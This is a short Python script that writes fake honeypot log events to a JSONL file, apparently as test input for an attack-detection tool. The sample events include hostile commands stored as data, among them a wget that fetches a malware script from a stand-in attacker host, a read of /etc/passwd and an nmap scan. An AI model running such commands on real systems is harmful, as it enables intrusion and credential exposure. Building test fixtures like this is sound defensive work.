import json
import os
from datetime import datetime, timedelta

LOG_DIR = os.path.expanduser('~/aade/logs')
os.makedirs(LOG_DIR, exist_ok=True)

now = datetime.now()

events = [
    {"timestamp": (now - timedelta(minutes=2)).isoformat(), "src_ip": "192.168.1.100", "cmd": "whoami", "hostname": "cowrie_entry"},
    {"timestamp": (now - timedelta(minutes=5)).isoformat(), "src_ip": "192.168.1.100", "cmd": "wget http://attacker.com/malware.sh", "hostname": "cowrie_entry"},
    {"timestamp": (now - timedelta(minutes=7)).isoformat(), "src_ip": "10.0.0.5", "cmd": "ps aux", "hostname": "target_vm"},
    {"timestamp": (now - timedelta(minutes=10)).isoformat(), "src_ip": "10.0.0.5", "cmd": "cat /etc/passwd", "hostname": "target_vm"},
    {"timestamp": (now - timedelta(hours=1)).isoformat(), "src_ip": "8.8.8.8", "cmd": "nmap -sV 192.168.1.1", "hostname": "cowrie_entry"}
]

with open(os.path.join(LOG_DIR, 'live_test.jsonl'), 'w') as f:
    for e in events:
        f.write(json.dumps(e) + '\n')

print(f"Generated {len(events)} events in {LOG_DIR}/live_test.jsonl")
